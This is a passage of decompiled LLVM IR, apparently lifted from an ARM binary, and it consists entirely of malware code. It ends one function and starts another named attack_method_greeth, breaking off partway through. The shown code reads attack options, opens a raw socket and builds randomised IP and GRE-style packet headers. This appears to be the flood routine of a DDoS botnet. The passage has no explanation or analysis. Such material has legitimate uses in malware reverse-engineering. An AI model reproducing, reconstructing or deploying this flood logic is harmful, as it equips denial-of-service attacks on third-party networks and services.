  %v5_9328 = or i32 %v5_9324, %v5_9314
  %v7_932c = lshr i32 %v0_92fc, %v4_9320
  %v8_932c = add i32 %v7_932c, %v5_9328
  store i32 %v8_932c, i32* %r2.global-to-local, align 4
  %v1_9330 = and i32 %v8_932c, 16711680
  store i32 %v1_9330, i32* %r0.global-to-local, align 4
  %v1_933c = and i32 %v8_932c, 65280
  store i32 %v1_933c, i32* %r1.global-to-local, align 4
  %v5_9344 = call i32 @llvm.bswap.i32(i32 %v8_932c)
  %v1_9348 = load i32, i32* @r5, align 4
  %v2_9348 = add i32 %v1_9348, 16
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v5_9344, i32* %v3_9348, align 4
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9358:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  %v0_9358 = call i32 @rand_next()
  store i32 %v0_9358, i32* %r0.global-to-local, align 4
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  %v1_936c = load i32, i32* @r5, align 4
  %v2_936c = add i32 %v1_936c, 12
  %v3_936c = inttoptr i32 %v2_936c to i32*
  store i32 %v0_9358, i32* %v3_936c, align 4
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_9358.dec_label_pc_923c_crit_edge

dec_label_pc_9358.dec_label_pc_923c_crit_edge:    ; preds = %dec_label_pc_9358
  %v1_9240.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_923c

dec_label_pc_9374:                                ; preds = %dec_label_pc_9358, %dec_label_pc_9228
  %v0_9374 = call i32 @rand_next()
  %v1_9374 = trunc i32 %v0_9374 to i16
  %v3_9378 = load i32, i32* @r5, align 4
  %v4_9378 = add i32 %v3_9378, 4
  %v5_9378 = inttoptr i32 %v4_9378 to i16*
  store i16 %v1_9374, i16* %v5_9378, align 2
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v1_9380 = load i32, i32* @r4, align 4
  %v9_9380 = icmp eq i32 %v3_9080, %v1_9380
  store i1 %v9_9380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9380, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9388:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v0_9388 = call i32 @rand_next()
  %v1_9388 = trunc i32 %v0_9388 to i16
  store i32 %v0_9388, i32* %r0.global-to-local, align 4
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v1_9390 = load i32, i32* @r4, align 4
  %v9_9390 = icmp eq i32 %v3_9098, %v1_9390
  store i1 %v9_9390, i1* %cpsr_z.global-to-local, align 1
  %v3_9394 = load i32, i32* @r5, align 4
  %v4_9394 = add i32 %v3_9394, 20
  %v5_9394 = inttoptr i32 %v4_9394 to i16*
  store i16 %v1_9388, i16* %v5_9394, align 2
  br i1 %v9_9390, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_939c:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  %v0_939c = call i32 @rand_next()
  %v1_939c = trunc i32 %v0_939c to i16
  store i32 %v0_939c, i32* %r0.global-to-local, align 4
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v3_93a8 = load i32, i32* @r6, align 4
  %v4_93a8 = add i32 %v3_93a8, 2
  %v5_93a8 = inttoptr i32 %v4_93a8 to i16*
  store i16 %v1_939c, i16* %v5_93a8, align 2
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c
  %v0_93b0 = load i32, i32* @r5, align 4
  %v1_93b0 = add i32 %v0_93b0, 28
  store i32 %v1_93b0, i32* %r0.global-to-local, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  %v2_93b8 = inttoptr i32 %v1_93b0 to i16*
  %v3_93b8 = call i32 @rand_str(i16* %v2_93b8, i32 %v0_90c8)
  store i32 %v3_93b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9260

dec_label_pc_93c0:                                ; preds = %dec_label_pc_9034
  %v0_93c0 = load i32, i32* @fp, align 4
  store i32 %v0_93c0, i32* %r0.global-to-local, align 4
  %v1_93c4 = call i32 @__GI___libc_close(i32 %v0_93c0)
  store i32 %v1_93c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %entry, %dec_label_pc_93c0
  %v1_93d0 = phi i32 [ %v3_9024, %entry ], [ %v1_93c4, %dec_label_pc_93c0 ]
  store i32 %v18_8eec, i32* %sb.global-to-local, align 4
  store i32 %v27_8eec, i32* %lr.global-to-local, align 4
  ret i32 %v1_93d0

; uselistorder directives
  uselistorder i32 %v0_939c, { 1, 0 }
  uselistorder i32 %v0_9388, { 1, 0 }
  uselistorder i32 %v1_9380, { 1, 0 }
  uselistorder i32 %v3_92f8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_92d4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_92a0, { 1, 0 }
  uselistorder i32 %v4_9290, { 1, 0 }
  uselistorder i1 %v2_93a4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9368, { 3, 2, 0, 1 }
  uselistorder i32 %v3_9114, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_90fc, { 1, 0 }
  uselistorder i32 %v1_90cc, { 1, 0, 2 }
  uselistorder i32 %v1_90c8, { 1, 0, 2 }
  uselistorder i32 %v3_90a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9088, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9080, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_9078, { 1, 0, 2 }
  uselistorder i32 %v0_90c8, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_9068, { 3, 1, 2, 0 }
  uselistorder i1 %v7_9054, { 1, 0 }
  uselistorder i1 %v7_9028, { 1, 0 }
  uselistorder i32 %v3_9024, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_9010, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_8ffc, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8f88, { 1, 0 }
  uselistorder i32 %v1_8f64, { 1, 0 }
  uselistorder i32 %v6_8f5c, { 1, 0 }
  uselistorder i32 %v7_8f44, { 1, 0, 2, 3 }
  uselistorder i8 %v5_8f40, { 1, 0 }
  uselistorder i32 %v6_8f20, { 1, 0 }
  uselistorder i32 %v2_8f08, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93c8, { 1, 0 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
  uselistorder label %dec_label_pc_9260, { 2, 1, 0 }
  uselistorder label %dec_label_pc_91f4, { 1, 0 }
  uselistorder label %dec_label_pc_91e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_91e4.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_method_greeth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @r5, align 4
  %v24_93d8 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_93f4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_93f8 = load i32, i32* @r5, align 4
  store i32 %v0_93f8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9408 = load i32, i32* @r4, align 4
  store i32 %v0_9408, i32* %r0.global-to-local, align 4
  %v5_940c = inttoptr i32 %v0_93f8 to i32*
  %v6_940c = call i32 @attack_get_opt_int(i32 %v0_9408, i32* %v5_940c, i32 2, i32 0)
  %v1_9418 = urem i32 %v6_940c, 256
  store i32 %v1_9418, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9424 = load i32, i32* @r5, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  %v0_9428 = load i32, i32* @r4, align 4
  store i32 %v0_9428, i32* %r0.global-to-local, align 4
  %v5_942c = trunc i32 %v6_940c to i8
  %v6_9430 = inttoptr i32 %v0_9424 to i32*
  %v7_9430 = call i32 @attack_get_opt_int(i32 %v0_9428, i32* %v6_9430, i32 3, i32 65535)
  %v0_9434 = load i32, i32* @r5, align 4
  store i32 %v0_9434, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9430, i32* %fp.global-to-local, align 4
  %v0_9444 = load i32, i32* @r4, align 4
  store i32 %v0_9444, i32* %r0.global-to-local, align 4
  %v4_9448 = inttoptr i32 %v0_9434 to i32*
  %v5_9448 = call i32 @attack_get_opt_int(i32 %v0_9444, i32* %v4_9448, i32 4, i32 64)
  %v1_9450 = urem i32 %v5_9448, 256
  store i32 %v1_9450, i32* %ip.global-to-local, align 4
  %v0_9454 = load i32, i32* @r5, align 4
  store i32 %v0_9454, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9460 = load i32, i32* @r4, align 4
  store i32 %v0_9460, i32* %r0.global-to-local, align 4
  %v6_9468 = inttoptr i32 %v0_9454 to i32*
  %v7_9468 = call i32 @attack_get_opt_int(i32 %v0_9460, i32* %v6_9468, i32 5, i32 1)
  %v1_9474 = urem i32 %v7_9468, 256
  store i32 %v1_9474, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9480 = load i32, i32* @r5, align 4
  store i32 %v0_9480, i32* %r1.global-to-local, align 4
  %v0_9484 = load i32, i32* @r4, align 4
  store i32 %v0_9484, i32* %r0.global-to-local, align 4
  %v5_948c = inttoptr i32 %v0_9480 to i32*
  %v6_948c = call i32 @attack_get_opt_int(i32 %v0_9484, i32* %v5_948c, i32 6, i32 65535)
  %v0_9494 = load i32, i32* @r5, align 4
  store i32 %v0_9494, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_948c, i32* @r8, align 4
  %v0_94a4 = load i32, i32* @r4, align 4
  store i32 %v0_94a4, i32* %r0.global-to-local, align 4
  %v4_94a8 = inttoptr i32 %v0_9494 to i32*
  %v5_94a8 = call i32 @attack_get_opt_int(i32 %v0_94a4, i32* %v4_94a8, i32 7, i32 65535)
  %v0_94ac = load i32, i32* @r5, align 4
  store i32 %v0_94ac, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_94a8, i32* @r7, align 4
  %v0_94bc = load i32, i32* @r4, align 4
  store i32 %v0_94bc, i32* %r0.global-to-local, align 4
  %v4_94c0 = inttoptr i32 %v0_94ac to i32*
  %v5_94c0 = call i32 @attack_get_opt_int(i32 %v0_94bc, i32* %v4_94c0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r5, align 4
  store i32 %v0_94d0, i32* %r1.global-to-local, align 4
  %v0_94d4 = load i32, i32* @r4, align 4
  store i32 %v0_94d4, i32* %r0.global-to-local, align 4
  %v4_94d8 = inttoptr i32 %v0_94d0 to i32*
  %v5_94d8 = call i32 @attack_get_opt_int(i32 %v0_94d4, i32* %v4_94d8, i32 1, i32 1)
  %v1_94e0 = urem i32 %v5_94d8, 256
  store i32 %v1_94e0, i32* %ip.global-to-local, align 4
  %v0_94e4 = load i32, i32* @r5, align 4
  store i32 %v0_94e4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_94f0 = load i32, i32* @r4, align 4
  store i32 %v0_94f0, i32* %r0.global-to-local, align 4
  %v5_94f8 = inttoptr i32 %v0_94e4 to i32*
  %v6_94f8 = call i32 @attack_get_opt_int(i32 %v0_94f0, i32* %v5_94f8, i32 19, i32 0)
  %v0_9500 = load i32, i32* @r5, align 4
  store i32 %v0_9500, i32* %r1.global-to-local, align 4
  %v2_9504 = load i32, i32* @global_var_241f0.57, align 4
  store i32 %v2_9504, i32* %r3.global-to-local, align 4
  store i32 %v6_94f8, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9510 = load i32, i32* @r4, align 4
  store i32 %v0_9510, i32* %r0.global-to-local, align 4
  %v4_9514 = inttoptr i32 %v0_9500 to i32*
  %v5_9514 = call i32 @attack_get_opt_int(i32 %v0_9510, i32* %v4_9514, i32 25, i32 %v2_9504)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9528 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v7_952c = icmp eq i32 %v3_9528, -1
  store i1 %v7_952c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_952c, label %dec_label_pc_9a40, label %dec_label_pc_9538

dec_label_pc_9538:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9540 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9540, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9554 = call i32 @__GI_setsockopt(i32 %v3_9528, i32 0, i32 3, i32 %v6_9540, i32 4)
  store i32 %v5_9554, i32* %r0.global-to-local, align 4
  %v7_9558 = icmp eq i32 %v5_9554, -1
  store i1 %v7_9558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9558, label %dec_label_pc_9a38, label %dec_label_pc_9560

dec_label_pc_9560:                                ; preds = %dec_label_pc_9538
  %v0_9560 = load i32, i32* @r8, align 4
  %v0_9564 = load i32, i32* @r7, align 4
  %v0_9568 = load i32, i32* %fp.global-to-local, align 4
  %v0_956c = load i32, i32* @r6, align 4
  %v1_956c = urem i32 %v0_956c, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9574 = urem i32 %v0_9560, 65536
  store i32 %v3_9574, i32* %r3.global-to-local, align 4
  %v3_9578 = urem i32 %v0_9564, 65536
  store i32 %v3_9578, i32* %r4.global-to-local, align 4
  %v0_957c = load i32, i32* @sl, align 4
  %v2_957c = icmp eq i32 %v0_957c, 0
  store i1 %v2_957c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9594 = urem i32 %v0_9568, 65536
  store i32 %v3_9594, i32* @fp, align 4
  br i1 %v2_957c, label %dec_label_pc_9a4c, label %dec_label_pc_95a4

dec_label_pc_95a4:                                ; preds = %dec_label_pc_9560
  %v3_9564 = mul i32 %v0_9564, 65536
  %v3_9560 = mul i32 %v0_9560, 65536
  %v0_9568.not = or i32 %v0_9568, -65536
  %v1_95a8 = xor i32 %v0_9568.not, 65535
  %v3_95ac = mul i32 %v5_94c0, 65536
  %v1_95b0 = add i32 %v3_95ac, 4325376
  %tmp73 = udiv i32 %v1_95b0, 256
  %v3_95c4 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_95a8, 256
  %v3_95c8 = and i32 %tmp74, 65280
  store i32 %v3_95c8, i32* %ip.global-to-local, align 4
  %v1_95cc = add i32 %v3_95ac, 524288
  %v1_95d4 = add i32 %v3_95ac, 1835008
  %tmp75 = udiv i32 %v1_95a8, 256
  %v4_95d8 = urem i32 %tmp75, 256
  %v5_95d8 = or i32 %v4_95d8, %v3_95c8
  %v4_95e0 = udiv i32 %v1_95b0, 16777216
  %v5_95e0 = or i32 %v3_95c4, %v4_95e0
  store i32 %v5_95e0, i32* @r8, align 4
  %v3_95ec = udiv i32 %v1_95d4, 256
  %tmp76 = mul i32 %v0_9568, 256
  %v3_95f0 = and i32 %tmp76, 65280
  store i32 %v3_9560, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_9568, 256
  %v4_9600 = urem i32 %tmp77, 256
  %v5_9600 = or i32 %v4_9600, %v3_95f0
  store i32 %v5_9600, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_9560, 256
  %v3_9604 = and i32 %tmp78, 65280
  %v1_9608 = and i32 %v3_95ec, 65280
  store i32 %v1_9608, i32* @r6, align 4
  store i32 %v3_9564, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_9564, 256
  %v3_9614 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_9560, 256
  %v4_9618 = urem i32 %tmp80, 256
  %v5_9618 = or i32 %v4_9618, %v3_9604
  store i32 %v5_9618, i32* @lr, align 4
  %v4_961c = udiv i32 %v1_95d4, 16777216
  %v5_961c = or i32 %v1_9608, %v4_961c
  store i32 %v5_961c, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_9564, 256
  %v4_9620 = urem i32 %tmp81, 256
  %v5_9620 = or i32 %v4_9620, %v3_9614
  %tmp82 = udiv i32 %v1_95cc, 256
  %v3_9624 = and i32 %tmp82, 65280
  store i32 %v3_9624, i32* @r5, align 4
  %v5_9628 = trunc i32 %v5_9600 to i16
  %v5_9630 = trunc i32 %v5_961c to i16
  %v4_9638 = udiv i32 %v1_95cc, 16777216
  %v5_9638 = or i32 %v3_9624, %v4_9638
  store i32 %v5_9638, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9694 = sext i8 %v5_942c to i32
  %v1_96a0 = trunc i32 %v5_9448 to i8
  %sext = mul nuw i32 %v5_95d8, 65536
  %v4_972c = sdiv i32 %sext, 65536
  %v2_9758 = icmp eq i32 %v1_956c, 0
  %sext8 = mul nuw i32 %v5_9618, 65536
  %v4_9778 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9620, 65536
  %v4_9780 = sdiv i32 %sext9, 65536
  %v1_973827 = trunc i32 %v4_972c to i16
  br label %dec_label_pc_9640

dec_label_pc_9640:                                ; preds = %bb85, %dec_label_pc_95a4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_964c = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_964c, i32* %r0.global-to-local, align 4
  %v2_9654 = load i32, i32* @r4, align 4
  %v5_9654 = mul i32 %v2_9654, 4
  %v6_9654 = add i32 %v5_9654, %v2_93f4
  %v7_9654 = inttoptr i32 %v6_9654 to i32*
  store i32 %v2_964c, i32* %v7_9654, align 4
  %v3_9658 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9658, i32* %r2.global-to-local, align 4
  %v5_9660 = mul i32 %v3_9658, 24
  %v1_9664 = load i32, i32* @sb, align 4
  %v2_9664 = add i32 %v1_9664, %v5_9660
  store i32 %v2_9664, i32* @lr, align 4
  store i32 %v2_93f4, i32* %r3.global-to-local, align 4
  %v4_966c = mul i32 %v3_9658, 4
  %v5_966c = add i32 %v4_966c, %v2_93f4
  %v6_966c = inttoptr i32 %v5_966c to i32*
  %v7_966c = load i32, i32* %v6_966c, align 4
  store i32 %v7_966c, i32* %r4.global-to-local, align 4
  %v1_9670 = inttoptr i32 %v7_966c to i8*
  %v2_9670 = load i8, i8* %v1_9670, align 1
  %tmp = urem i8 %v2_9670, 16
  %v1_9674 = zext i8 %tmp to i32
  %v1_9678 = or i32 %v1_9674, 64
  store i32 %v1_9678, i32* %r3.global-to-local, align 4
  %v1_967c = trunc i32 %v1_9678 to i8
  store i8 %v1_967c, i8* %v1_9670, align 1
  %v0_9680 = load i32, i32* %r4.global-to-local, align 4
  %v1_9680 = inttoptr i32 %v0_9680 to i8*
  %v2_9680 = load i8, i8* %v1_9680, align 1
  %v1_9684 = and i8 %v2_9680, -16
  %v1_9688 = or i8 %v1_9684, 5
  store i32 %v1_9474, i32* %r5.global-to-local, align 4
  store i8 %v1_9688, i8* %v1_9680, align 1
  store i32 %v4_9694, i32* %r1.global-to-local, align 4
  %v2_9698 = load i32, i32* %r4.global-to-local, align 4
  %v3_9698 = add i32 %v2_9698, 1
  %v4_9698 = inttoptr i32 %v3_9698 to i8*
  store i8 %v5_942c, i8* %v4_9698, align 1
  store i32 %v1_9450, i32* %r2.global-to-local, align 4
  %v2_96a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a0 = add i32 %v2_96a0, 8
  %v4_96a0 = inttoptr i32 %v3_96a0 to i8*
  store i8 %v1_96a0, i8* %v4_96a0, align 1
  %v2_96a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a8 = add i32 %v2_96a8, 4
  %v4_96a8 = inttoptr i32 %v3_96a8 to i16*
  store i16 %v5_9628, i16* %v4_96a8, align 2
  %v2_96b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96b0 = add i32 %v2_96b0, 9
  %v4_96b0 = inttoptr i32 %v3_96b0 to i8*
  store i8 47, i8* %v4_96b0, align 1
  store i32 %v5_9514, i32* %r3.global-to-local, align 4
  %v0_96b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_96b8 = icmp eq i32 %v0_96b8, 0
  store i1 %v2_96b8, i1* %cpsr_z.global-to-local, align 1
  %v1_96bc = load i32, i32* %r4.global-to-local, align 4
  %v2_96bc = add i32 %v1_96bc, 12
  %v3_96bc = inttoptr i32 %v2_96bc to i32*
  store i32 %v5_9514, i32* %v3_96bc, align 4
  br i1 %v2_96b8, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_9640
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_96c4 = load i32, i32* %r4.global-to-local, align 4
  %v4_96c4 = add i32 %v3_96c4, 6
  %v5_96c4 = inttoptr i32 %v4_96c4 to i16*
  store i16 64, i16* %v5_96c4, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_9640, %bb
  %v0_96c8 = load i32, i32* @lr, align 4
  %v1_96c8 = add i32 %v0_96c8, 16
  %v2_96c8 = inttoptr i32 %v1_96c8 to i32*
  %v3_96c8 = load i32, i32* %v2_96c8, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_96d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_96d0 = add i32 %v1_96d0, 16
  %v3_96d0 = inttoptr i32 %v2_96d0 to i32*
  store i32 %v3_96c8, i32* %v3_96d0, align 4
  %v0_96d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_96d4 = add i32 %v0_96d4, 24
  store i32 %v1_96d4, i32* %r1.global-to-local, align 4
  %v1_96d8 = add i32 %v0_96d4, 20
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  %v0_96dc = load i32, i32* %ip.global-to-local, align 4
  %v1_96dc = add i32 %v0_96dc, 101
  store i32 %v1_96dc, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_96e8 = load i32, i32* @r8, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i16
  %v3_96e8 = add i32 %v0_96d4, 2
  %v4_96e8 = inttoptr i32 %v3_96e8 to i16*
  store i16 %v1_96e8, i16* %v4_96e8, align 2
  %v0_96ec = load i32, i32* %ip.global-to-local, align 4
  %v1_96ec = trunc i32 %v0_96ec to i16
  %v2_96ec = load i32, i32* %r0.global-to-local, align 4
  %v3_96ec = add i32 %v2_96ec, 2
  %v4_96ec = inttoptr i32 %v3_96ec to i16*
  store i16 %v1_96ec, i16* %v4_96ec, align 2
  %v0_96f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96f0 = trunc i32 %v0_96f0 to i8
  %v2_96f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f0 = add i32 %v2_96f0, 13
  %v4_96f0 = inttoptr i32 %v3_96f0 to i8*
  store i8 %v1_96f0, i8* %v4_96f0, align 1
  %v0_96f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_96f4 = trunc i32 %v0_96f4 to i8
  %v2_96f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f4 = add i32 %v2_96f4, 12
  %v4_96f4 = inttoptr i32 %v3_96f4 to i8*
  store i8 %v1_96f4, i8* %v4_96f4, align 1
  %v0_96f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96f8 = add i32 %v0_96f8, 38
  %v2_96f8 = inttoptr i32 %v1_96f8 to i8*
  %v3_96f8 = load i8, i8* %v2_96f8, align 1
  %tmp89 = urem i8 %v3_96f8, 16
  %v1_96fc = zext i8 %tmp89 to i32
  %v1_9700 = or i32 %v1_96fc, 64
  store i32 %v1_9700, i32* %r3.global-to-local, align 4
  %v1_9704 = trunc i32 %v1_9700 to i8
  store i8 %v1_9704, i8* %v2_96f8, align 1
  %v0_9708 = load i32, i32* %r4.global-to-local, align 4
  %v1_9708 = add i32 %v0_9708, 38
  %v2_9708 = inttoptr i32 %v1_9708 to i8*
  %v3_9708 = load i8, i8* %v2_9708, align 1
  %v1_970c = and i8 %v3_9708, -16
  %v1_9710 = or i8 %v1_970c, 5
  store i8 %v1_9710, i8* %v2_9708, align 1
  %v0_971c = load i32, i32* %r4.global-to-local, align 4
  %v1_971c = add i32 %v0_971c, 38
  store i32 %v1_971c, i32* @r5, align 4
  %v3_9720 = add i32 %v0_971c, 39
  %v4_9720 = inttoptr i32 %v3_9720 to i8*
  store i8 %v5_942c, i8* %v4_9720, align 1
  store i32 %v5_961c, i32* %r2.global-to-local, align 4
  %v2_9728 = load i32, i32* @r5, align 4
  %v3_9728 = add i32 %v2_9728, 2
  %v4_9728 = inttoptr i32 %v3_9728 to i16*
  store i16 %v5_9630, i16* %v4_9728, align 2
  store i32 %v4_972c, i32* %r3.global-to-local, align 4
  store i32 %v1_9450, i32* %r1.global-to-local, align 4
  %v0_9734 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9734, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_973828 = load i32, i32* @r5, align 4
  %v3_973829 = add i32 %v2_973828, 4
  %v4_973830 = inttoptr i32 %v3_973829 to i16*
  store i16 %v1_973827, i16* %v4_973830, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_9738 = load i32, i32* @r5, align 4
  %v3_9738 = add i32 %v2_9738, 4
  %v4_9738 = inttoptr i32 %v3_9738 to i16*
  store i16 %v1_973827, i16* %v4_9738, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_9740 = load i32, i32* %r2.global-to-local, align 4
  %v2_9740 = trunc i32 %v1_9740 to i16
  %v3_9740 = load i32, i32* @r5, align 4
  %v4_9740 = add i32 %v3_9740, 6
  %v5_9740 = inttoptr i32 %v4_9740 to i16*
  store i16 %v2_9740, i16* %v5_9740, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_9744 = load i32, i32* %r1.global-to-local, align 4
